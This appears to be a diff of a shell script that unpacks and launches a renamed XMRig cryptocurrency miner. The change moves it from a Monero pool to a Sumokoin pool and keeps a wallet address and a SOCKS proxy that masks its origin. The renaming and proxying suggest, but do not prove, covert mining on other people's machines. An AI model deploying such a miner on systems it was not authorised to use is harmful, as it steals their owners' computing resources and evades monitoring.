@@ -3,4 +3,4 @@ tar xf *gz
 rm *gz
 cd mi*
 sudo sysctl -w vm.nr_hugepages=128
-./xmrigDaemon --donate-level 1 -o xmr.bohemianpool.com:7777 -u 82nZfyK2fkAhX2bHD4QvVkMhKXpqQzV4FL6pgfpcWCWZMdmNTpykKZ1PMwFABB6aaAF2LujVwhKqH9yjMLGzhm2xEYpKPNE -p z -k --coin monero -a rx/0 --proxy=72.210.252.137:4145
+./xmrigDaemon --donate-level 1 -a cn/r -o ca.sumo.herominers.com:10611 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeaiKHLqcU2UCZNsM91h -k --tls -p z --proxy=72.210.252.137:4145
